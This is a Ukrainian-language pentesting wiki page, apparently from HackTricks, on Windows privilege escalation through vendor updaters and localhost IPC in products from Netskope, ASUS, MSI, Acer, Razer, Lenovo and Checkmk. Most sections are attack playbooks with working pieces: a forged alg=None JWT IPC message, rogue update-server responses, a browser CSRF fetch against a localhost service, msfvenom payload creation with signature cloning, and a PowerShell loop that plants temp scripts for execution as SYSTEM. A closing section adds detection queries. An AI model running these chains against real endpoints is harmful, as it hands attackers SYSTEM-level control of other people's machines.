# Зловживання корпоративними Auto-Updaters і привілейованим IPC (наприклад, Netskope, ASUS та MSI)

{{#include ../../banners/hacktricks-training.md}}

Ця сторінка узагальнює клас ланцюжків локального підвищення привілеїв у Windows, виявлених у корпоративних endpoint-агентах та updaters, які надають просту поверхню IPC і привілейований процес оновлення. Показовим прикладом є Netskope Client for Windows < R129 (CVE-2025-0309), де користувач із низькими привілеями може змусити систему повторно виконати enrollment на сервері під контролем атакувальника, а потім доставити шкідливий MSI, який встановлює SYSTEM service.<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>

Ключові ідеї, які можна застосувати проти подібних продуктів:
- Зловживати localhost IPC привілейованого service, щоб змусити його повторно виконати enrollment або змінити конфігурацію на сервер атакувальника.
- Реалізувати update endpoints постачальника, доставити rogue Trusted Root CA і вказати updater на шкідливий «підписаний» package.
- Обійти слабкі перевірки signer (списки дозволених CN), optional digest flags і послаблені властивості MSI.
- Якщо IPC «зашифрований», отримати key/IV із machine identifiers, доступних для читання всіма, які зберігаються в registry.
- Якщо service обмежує callers за image path/process name, виконати injection в allow-listed process або створити його suspended і завантажити DLL за допомогою мінімальної зміни thread context.

---
## 1) Примусовий enrollment на сервер атакувальника через localhost IPC

Багато агентів постачають user-mode UI process, який взаємодіє із SYSTEM service через localhost TCP, використовуючи JSON.

Спостереження в Netskope:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

流程 exploitation:
1) Створити JWT enrollment token, claims якого керують backend host (наприклад, AddonUrl). Використати alg=None, щоб підпис не був потрібен.
2) Надіслати IPC message, що викликає provisioning command, разом із JWT і tenant name:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) Сервіс починає звертатися до вашого rogue server для enrollment/config, наприклад:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Примітки:
- Якщо caller verification базується на path/name, ініціюйте запит із allow-listed vendor binary (див. §4).<sup>[[1]](#references)[[2]](#references)</sup>

---
## 2) Hijacking update channel для виконання code від імені SYSTEM

Після того як client починає взаємодіяти з вашим server, реалізуйте очікувані endpoints і скеруйте його на MSI зловмисника. Типова послідовність:

1) /v2/config/org/clientconfig → Поверніть JSON config із дуже коротким updater interval, наприклад:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → Повертає PEM CA certificate. Сервіс встановлює його до сховища Local Machine Trusted Root.
3) /v2/checkupdate → Надає metadata, що вказує на malicious MSI і fake version.

Обхід поширених перевірок, які трапляються на практиці:
- Signer CN allow-list: сервіс може лише перевіряти, чи Subject CN дорівнює “netSkope Inc” або “Netskope, Inc.”. Ваш rogue CA може випустити leaf із таким CN і підписати MSI.
- CERT_DIGEST property: додайте benign MSI property із назвою CERT_DIGEST. Під час встановлення enforcement відсутній.
- Optional digest enforcement: config flag (наприклад, check_msi_digest=false) вимикає додаткову cryptographic validation.

Результат: SYSTEM service встановлює ваш MSI з
C:\ProgramData\Netskope\stAgent\data\*.msi
і виконує arbitrary code від імені NT AUTHORITY\SYSTEM.<sup>[[1]](#references)[[2]](#references)</sup>

Урок щодо обходу patch: якщо vendor реагує, додаючи allow-list із невеликого набору “trusted” domains замість cryptographically authenticating update source, шукайте vendor-owned redirectors або reverse proxies, які все ще дають змогу вам керувати traffic. У випадку Netskope подальше public research показало, що allow-list епохи R129 усе ще можна було обійти через `rproxy.goskope.com`, який проксіював attacker-controlled Azure App Service content. Розглядайте hostname allow-lists як speed bump, а не trust boundary.<sup>[[14]](#references)</sup>

---
## 3) Підробка encrypted IPC requests (якщо присутні)

Починаючи з R127, Netskope обгортав IPC JSON у поле encryptData, яке виглядає як Base64. Reversing показав, що використовується AES із key/IV, отриманими з registry values, доступних для читання будь-якому user:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Attackers можуть відтворити encryption і надсилати valid encrypted commands зі standard user.<sup>[[1]](#references)[[2]](#references)</sup> Загальна порада: якщо agent раптово починає “encrypt” свій IPC, шукайте device IDs, product GUIDs, install IDs у HKLM як material.

---
## 4) Обхід IPC caller allow-lists (path/name checks)

Деякі services намагаються authenticate peer, визначаючи PID TCP connection і порівнюючи image path/name з allow-listed vendor binaries, розташованими в Program Files (наприклад, stagentui.exe, bwansvc.exe, epdlp.exe).

Два практичні bypass:
- DLL injection в allow-listed process (наприклад, nsdiag.exe) і proxy IPC зсередини нього.
- Запустити allow-listed binary у suspended стані та bootstrap ваш proxy DLL без CreateRemoteThread (див. §5), щоб виконати driver-enforced tamper rules.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 5) Tamper-protection friendly injection: suspended process + NtContinue patch

Products часто постачаються з minifilter/OB callbacks driver (наприклад, Stadrv), який прибирає небезпечні rights з handles до protected processes:
- Process: видаляє PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: обмежує до THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

Надійний user-mode loader, який дотримується цих обмежень:
1) CreateProcess vendor binary із CREATE_SUSPENDED.
2) Отримати handles, які все ще дозволені: PROCESS_VM_WRITE | PROCESS_VM_OPERATION для process і thread handle з THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (або лише THREAD_RESUME, якщо ви patch code за відомим RIP).
3) Перезаписати ntdll!NtContinue (або інший early, guaranteed-mapped thunk) невеликим stub, який викликає LoadLibraryW для вашого DLL path, а потім повертається назад.
4) ResumeThread, щоб запустити ваш stub in-process і завантажити DLL.

Оскільки ви не використовували PROCESS_CREATE_THREAD або PROCESS_SUSPEND_RESUME для вже protected process (ви його створили), policy driver задовольняється.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 6) Практичні tooling
- NachoVPN (Netskope plugin) автоматизує rogue CA, підписування malicious MSI і обслуговує необхідні endpoints: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.<sup>[[3]](#references)</sup>
- UpSkope — custom IPC client, який створює arbitrary (опційно AES-encrypted) IPC messages і містить suspended-process injection для відправлення їх з allow-listed binary.<sup>[[4]](#references)</sup>

## 7) Швидкий triage workflow для невідомих updater/IPC surfaces

Під час роботи з новим endpoint agent або motherboard “helper” suite зазвичай достатньо швидкого workflow, щоб визначити, чи є перед вами перспективна privesc target:<sup>[[6]](#references)</sup>

1) Перелічити loopback listeners і зіставити їх із vendor processes:
```powershell
Get-NetTCPConnection -State Listen |
Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
Select-Object LocalAddress,LocalPort,OwningProcess,
@{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```
2) Перелічити іменовані канали-кандидати:
```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```
3) Збирайте дані маршрутизації, що зберігаються в реєстрі та використовуються IPC-серверами на основі плагінів:
```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
Select-Object PSChildName
```
4) Спочатку витягніть назви endpoint, JSON-ключі та ID команд із клієнта user-mode. Packed Electron/.NET frontend часто leak повну схему:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
-Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```
5) Шукайте фактичну умову довіри, а не лише шлях виконання коду, який зрештою запускає процес:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
-Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```
Пріоритетні патерни для перевірки:
- `CryptQueryObject`/парсинг сертифікатів без `WinVerifyTrust` зазвичай означає, що логіку «сертифікат існує» трактували як «сертифікат є довіреним», що дає змогу клонувати сертифікати або застосовувати інші прийоми з підробленим підписантом.
- Перевірки підрядків/суфіксів у `Origin`, `Referer`, URL завантажень, назвах процесів або CN підписанта не є автентифікацією. `contains(".vendor.com")` зазвичай можна експлуатувати за допомогою контрольованих атакувальником доменів-двійників.
- Якщо GUI із низькими привілеями вирішує, що «файл є довіреним», а SYSTEM broker лише використовує цей результат, patching або повторна реалізація клієнтської DLL/JS часто повністю обходить цю межу (розділена валідація у стилі Razer).
- Якщо broker копіює payload до `%TEMP%`/`C:\Windows\Temp`, а потім перевіряє або планує його запуск із цього шляху, одразу перевіряйте наявність вікон заміни TOCTOU, а також сусідніх plugin-модулів, які надають альтернативні обгортки `ExecuteTask()` зі слабшими перевірками.<sup>[[6]](#references)</sup>

Для цілей із великою кількістю named pipe, PipeViewer — це швидкий спосіб виявити слабкі DACL і pipe, доступні віддалено, перш ніж починати детально реверсити протокол.<sup>[[11]](#references)</sup>

Якщо ціль автентифікує callers лише за PID, шляхом до image або назвою процесу, сприймайте це радше як перешкоду, а не межу: часто достатньо виконати injection у легітимний client або встановити з’єднання з allow-listed process, щоб пройти перевірки сервера. Для named pipe, зокрема, [ця сторінка про client impersonation і pipe abuse](named-pipe-client-impersonation.md) детальніше описує цей primitive.

---
## 8) Modular add-in brokers, автентифіковані лише підписами vendor (патерн Lenovo Vantage)

Новий варіант, який варто шукати, — **signed-client RPC broker**: desktop-процес із низькими привілеями, підписаний Lenovo, взаємодіє із сервісом SYSTEM, а сервіс спрямовує JSON-команди до набору add-in, описаних у XML, у `%ProgramData%`. Щойно code execution досягнуто **всередині будь-якого прийнятого signed client**, кожен контракт `runas="system"` стає частиною вашої attack surface.<sup>[[15]](#references)</sup>

Високоцінні primitives, виявлені під час досліджень Lenovo Vantage:
- **Довіра до caller, оскільки він підписаний vendor**: дослідники отримали автентифікований контекст, скопіювавши Lenovo-signed EXE до writable directory і виконавши DLL side-load (`profapi.dll`), завдяки чому arbitrary code виконувався всередині client, якому service уже довіряв.
- **Виявлення attack surface на основі manifest**: add-in оголошені в `C:\ProgramData\Lenovo\Vantage\Addins\*.xml`; кілька контрактів запускаються як `SYSTEM`, тому перелік цих manifest часто швидше розкриває реальні privileged verbs, ніж реверс самого broker.
- **Per-command bugs за автентифікованим channel**: опинившись усередині trusted client, публічні дослідження виявили path traversal + race conditions у verb оновлення/інсталяції, raw-SQL abuse у privileged settings databases і перевірки registry path на основі підрядків, які давали змогу виконувати записи за межами призначеного hive.

Корисна recon на цілі:
```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
-Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```
Практичний висновок: щоразу, коли helper suite надає broker, який спочатку автентифікує **caller process**, а потім розподіляє запити між десятками plugin/add-in команд, не зупиняйтеся після обходу front-door trust check. Вивантажте manifest/contract table і fuzz кожен high-privilege verb окремо; автентифікований канал зазвичай приховує кілька second-stage bugs.

---
## 1) Browser-to-localhost CSRF проти privileged HTTP APIs (ASUS DriverHub)

DriverHub постачається з user-mode HTTP service (ADU.exe) на 127.0.0.1:53000, який очікує browser calls, що надходять із https://driverhub.asus.com. Origin filter просто виконує `string_contains(".asus.com")` для Origin header і download URLs, доступних через `/asus/v1.0/*`. Тому будь-який attacker-controlled host, наприклад `https://driverhub.asus.com.attacker.tld`, проходить перевірку й може надсилати state-changing requests із JavaScript.<sup>[[6]](#references)</sup> Див. [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md), щоб ознайомитися з додатковими bypass patterns.

Практичний сценарій:
1) Зареєструйте domain, який містить `.asus.com`, і розмістіть там malicious webpage.
2) Використайте `fetch` або XHR для виклику privileged endpoint (наприклад, `Reboot`, `UpdateApp`) на `http://127.0.0.1:53000`.
3) Надішліть JSON body, очікуваний handler, — packed frontend JS показує наведену нижче schema.
```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```
Навіть наведений нижче PowerShell CLI успішно виконується, якщо підробити заголовок Origin, вказавши довірене значення:
```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
-Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
-Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```
Будь-яке відвідування браузером сайту attacker тому стає локальним CSRF в 1 клік (або в 0 кліків через `onload`), який керує helper-процесом із правами SYSTEM.

---
## 2) Небезпечна перевірка code-signing і клонування сертифіката (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` завантажує довільні executable-файли, визначені в JSON body, і кешує їх у `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. Валідація URL завантаження повторно використовує ту саму substring logic, тому `http://updates.asus.com.attacker.tld:8000/payload.exe` приймається. Після завантаження ADU.exe лише перевіряє, що PE містить signature і що рядок Subject відповідає ASUS, перш ніж запустити його — без `WinVerifyTrust` і без перевірки chain.

Щоб weaponize цей flow:
1) Створити payload (наприклад, `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Клонувати signer ASUS у нього (наприклад, `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Розмістити `pwn.exe` на lookalike-домені `.asus.com` і запустити UpdateApp через описаний вище browser CSRF.

Оскільки як Origin-, так і URL-фільтри базуються на substring, а перевірка signer порівнює лише рядки, DriverHub завантажує та виконує attacker binary у своєму elevated context.<sup>[[6]](#references)</sup>

---
## 1) TOCTOU всередині шляхів копіювання/виконання updater (MSI Center CMD_AutoUpdateSDK)

SYSTEM service MSI Center відкриває TCP protocol, у якому кожен frame має формат `4-byte ComponentID || 8-byte CommandID || ASCII arguments`. Core component (Component ID `0f 27 00 00`) містить `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Його handler:
1) Копіює переданий executable у `C:\Windows\Temp\MSI Center SDK.exe`.
2) Перевіряє signature через `CS_CommonAPI.EX_CA::Verify` (subject сертифіката має дорівнювати “MICRO-STAR INTERNATIONAL CO., LTD.”, а `WinVerifyTrust` має завершитися успішно).
3) Створює scheduled task, який запускає temp file від SYSTEM з аргументами, контрольованими attacker.

Скопійований file не блокується між перевіркою та `ExecuteTask()`. Attacker може:
- Надіслати Frame A, що вказує на легітимний MSI-signed binary (гарантуючи успішне проходження перевірки signature і постановку task у чергу).
- Змагатися з ним за допомогою повторюваних повідомлень Frame B, що вказують на malicious payload і перезаписують `MSI Center SDK.exe` одразу після завершення перевірки.

Коли scheduler спрацьовує, він виконує перезаписаний payload від SYSTEM, попри те, що спочатку було перевірено оригінальний file. Надійна експлуатація використовує дві goroutine/thread, які надсилають CMD_AutoUpdateSDK у циклі, доки не буде виграно TOCTOU window.<sup>[[6]](#references)</sup>

---
## 2) Зловживання custom SYSTEM-level IPC та impersonation (MSI Center + Acer Control Centre)

### TCP command sets MSI Center
- Кожен plugin/DLL, завантажений `MSI.CentralServer.exe`, отримує Component ID, збережений у `HKLM\SOFTWARE\MSI\MSI_CentralServer`. Перші 4 байти frame вибирають цей component, дозволяючи attacker маршрутизувати commands до довільних modules.
- Plugins можуть визначати власні task runners. `Support\API_Support.dll` відкриває `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` і напряму викликає `API_Support.EX_Task::ExecuteTask()` без перевірки signature — будь-який local user може вказати на `C:\Users\<user>\Desktop\payload.exe` і детерміновано отримати виконання від SYSTEM.
- Sniffing loopback через Wireshark або instrumenting .NET binaries у dnSpy швидко показує Component ↔ command mapping; після цього custom Go/ Python clients можуть відтворювати frames.<sup>[[6]](#references)</sup>

### Named pipes Acer Control Centre та impersonation levels
- `ACCSvc.exe` (SYSTEM) відкриває `\\.\pipe\treadstone_service_LightMode`, а його discretionary ACL дозволяє remote clients (наприклад, `\\TARGET\pipe\treadstone_service_LightMode`). Надсилання command ID `7` із file path викликає process-spawning routine service.
- Client library серіалізує magic terminator byte (113) разом з args. Dynamic instrumentation через Frida/`TsDotNetLib` (див. [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) для порад щодо instrumentation) показує, що native handler зіставляє це значення з `SECURITY_IMPERSONATION_LEVEL` та integrity SID перед викликом `CreateProcessAsUser`.
- Заміна 113 (`0x71`) на 114 (`0x72`) переводить виконання в generic branch, який зберігає повний SYSTEM token і встановлює high-integrity SID (`S-1-16-12288`). Тому spawned binary запускається як unrestricted SYSTEM — локально та між машинами.
- Поєднайте це з exposed installer flag (`Setup.exe -nocheck`), щоб розгорнути ACC навіть на lab VM і тестувати pipe без vendor hardware.<sup>[[6]](#references)</sup>

Ці IPC bugs показують, чому localhost services мають enforce mutual authentication (ALPC SIDs, фільтри `ImpersonationLevel=Impersonation`, token filtering), а також чому кожен helper модуля для “run arbitrary binary” має використовувати ті самі signer verifications.

---
## 3) COM/IPC “elevator” helpers із weak user-mode validation (Razer Synapse 4)

Razer Synapse 4 додав ще один корисний pattern до цього family: low-privileged user може попросити COM helper запустити process через `RzUtility.Elevator`, тоді як рішення щодо trust делегується user-mode DLL (`simple_service.dll`), а не забезпечується належним чином усередині privileged boundary.

Спостережуваний exploitation path:
- Інстанціювати COM object `RzUtility.Elevator`.
- Викликати `LaunchProcessNoWait(<path>, "", 1)`, щоб запросити elevated launch.
- У public PoC PE-signature gate всередині `simple_service.dll` patch-иться перед надсиланням request, що дозволяє запустити довільний executable, вибраний attacker.<sup>[[6]](#references)</sup>

Мінімальний PowerShell invocation:
```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```
Загальний висновок: під час reverse engineering «helper»-наборів не обмежуйтеся localhost TCP або named pipes. Перевіряйте COM-класи з назвами на кшталт `Elevator`, `Launcher`, `Updater` або `Utility`, а потім з'ясовуйте, чи привілейована служба сама перевіряє цільовий binary, чи лише довіряє результату, обчисленому patchable user-mode client DLL. Цей шаблон узагальнюється за межі Razer: будь-яка розділена архітектура, у якій high-privilege broker отримує рішення allow/deny від low-privilege сторони, є потенційною privesc surface.


---
## Predictable temp script execution during MSI repair (Checkmk Agent / CVE-2024-0670)

Деякі Windows agents досі реалізують привілейовані дії, записуючи тимчасовий `.cmd` у `C:\Windows\Temp` і виконуючи його від імені `SYSTEM`. Якщо ім'я файлу передбачуване, а служба небезпечно обробляє вже наявні файли, користувач із низькими привілеями може заздалегідь створити майбутній temp-файл як **read-only** і змусити привілейований процес виконати attacker-controlled content замість власного script.

Виявлено у вразливих збірках Checkmk Agent:
- temp pattern: `cmk_all_<PID>_1.cmd`
- affected branches: `2.0.0`, `2.1.0`, `2.2.0`
- trigger: MSI **repair** cached agent package<sup>[[8]](#references)[[9]](#references)</sup>

Практичний workflow:
1. Оцініть реалістичний діапазон PID на основі поточних process IDs або PID запущеного agent.
2. Запишіть короткий **ASCII** `.cmd` payload (`Set-Content -Encoding Ascii` або перенаправлення `cmd.exe`; уникайте UTF-16 PowerShell output для batch files).
3. Створіть файли `C:\Windows\Temp\cmk_all_<PID>_1.cmd` у всьому candidate range і позначте кожен файл як read-only.
4. Trigger repair cached MSI, щоб privileged service спробувала повторно створити, а потім виконала temp script.<sup>[[7]](#references)</sup>
```powershell
Set-Content -Path C:\ProgramData\payload.cmd -Encoding Ascii -Value "@echo off`nwhoami > C:\ProgramData\proof.txt"
1..10000 | ForEach-Object {
Copy-Item C:\ProgramData\payload.cmd "C:\Windows\Temp\cmk_all_${_}_1.cmd"
Set-ItemProperty "C:\Windows\Temp\cmk_all_${_}_1.cmd" -Name IsReadOnly -Value $true
}
```
Якщо вразливий продукт встановлено за допомогою Windows Installer, зіставте кешований MSI-файл із випадковою на вигляд назвою в `C:\Windows\Installer` з назвою його продукту, перш ніж запускати відновлення:<sup>[[7]](#references)</sup>
```powershell
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties" |
ForEach-Object {
$p = Get-ItemProperty $_.PSPath
[PSCustomObject]@{Name=$p.DisplayName; Pkg=$p.LocalPackage}
} | Where-Object Name -like "*Check MK Agent*"

msiexec /fa C:\Windows\Installer\<cached-agent>.msi
```
Операційні примітки:
- `qwinsta` корисна, коли `msiexec /fa` не спрацьовує з неінтерактивної WinRM shell і потрібно зрозуміти, чи наявна desktop/disconnected session може коректно запустити repair.<sup>[[7]](#references)</sup>
- Цей шаблон узагальнюється на інші endpoint agents та updaters, які **зберігають тимчасові scripts у world-writable locations, а згодом виконують їх як SYSTEM**. Перевіряйте передбачувані імена, відсутність exclusive create semantics і flows repair/update, які можна запускати on demand.

---
## Remote supply-chain hijack via weak updater validation (WinGUp / Notepad++)

У період із червня 2025 року до грудня 2025 року attackers, які скомпрометували hosting infrastructure за Notepad++ update flow, вибірково надсилали malicious manifests визначеним victims. Старі updaters на базі WinGUp не виконували повну перевірку update authenticity, тому hostile XML response могла перенаправити clients на URLs, контрольовані attackers. Оскільки client приймав HTTPS content без обов'язкової перевірки trusted certificate chain і valid PE signature завантаженого installer, victims завантажували та виконували trojanized NSIS `update.exe`.<sup>[[12]](#references)[[13]](#references)</sup>

Operational flow (локальний exploit не потрібен):
1. **Infrastructure interception**: скомпрометувати CDN/hosting і відповідати на update checks за допомогою attacker metadata, що вказує на malicious download URL.
2. **Trojanized NSIS**: installer завантажує/виконує payload і зловживає двома execution chains:
- **Bring-your-own signed binary + sideload**: додати signed Bitdefender `BluetoothService.exe` і розмістити malicious `log.dll` у його search path. Коли signed binary запускається, Windows виконує sideload `log.dll`, яка розшифровує та reflectively loads Chrysalis backdoor (захищений Warbird + API hashing для ускладнення static detection).
- **Scripted shellcode injection**: NSIS виконує compiled Lua script, який використовує Win32 APIs (наприклад, `EnumWindowStationsW`) для ін'єкції shellcode і розгортання Cobalt Strike Beacon.<sup>[[12]](#references)</sup>

Hardening/detection висновки для будь-якого auto-updater:
- Забезпечте **certificate + signature verification** завантаженого installer (закріпіть vendor signer, відхиляйте невідповідні CN/chain) і підписуйте сам update manifest (наприклад, XMLDSig). Блокуйте manifest-controlled redirects, якщо вони не пройшли перевірку.
- Розглядайте **BYO signed binary sideloading** як post-download detection pivot: створюйте alert, коли signed vendor EXE завантажує DLL з іменем, що походить із canonical install path (наприклад, Bitdefender завантажує `log.dll` із Temp/Downloads), а також коли updater розміщує/виконує installers із temp із non-vendor signatures.
- Відстежуйте **malware-specific artifacts**, помічені в цьому chain (корисні як generic pivots): mutex `Global\Jdhfv_1.0.1`, аномальні записи `gup.exe` у `%TEMP%` і Lua-driven shellcode injection stages.
- Notepad++ посилив WinGUp у v8.8.9 і пізніших версіях: повернутий XML тепер підписується (XMLDSig), а новіші builds забезпечують certificate + signature verification завантаженого installer замість довіри лише до transport.<sup>[[13]](#references)</sup>

<details>
<summary>Cortex XDR XQL – Bitdefender-signed EXE sideloading <code>log.dll</code> (T1574.001)</summary>
```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```
</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> запускає інсталятор, що не є Notepad++</summary>
```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```
</details>

Ці шаблони узагальнюються для будь-якого updater, який приймає unsigned manifests або не фіксує signers інсталятора: hijack мережі + malicious installer + sideloading із власним підписом забезпечують remote code execution під виглядом “trusted” оновлень.

---
## Посилання
- [1] [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [2] [Netskope Security Advisory NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [3] [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [4] [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [5] [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [6] [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre and Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [7] [0xdf – HTB: NanoCorp](https://0xdf.gitlab.io/2026/06/20/htb-nanocorp.html)
- [8] [SEC Consult – Local Privilege Escalation via writable files in Checkmk Agent](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/)
- [9] [Checkmk Werk #16361 – Privilege escalation in Windows agent](https://checkmk.com/werk/16361)
- [10] [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)
- [11] [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
- [12] [Unit 42 – Nation-State Actors Exploit Notepad++ Supply Chain](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [13] [Notepad++ – hijacked infrastructure incident update](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
- [14] [AmberWolf – Bypassing the fix for CVE-2025-0309 in Netskope Client for Windows](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [15] [Atredis – Uncovering Privilege Escalation Bugs in Lenovo Vantage](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)

{{#include ../../banners/hacktricks-training.md}}
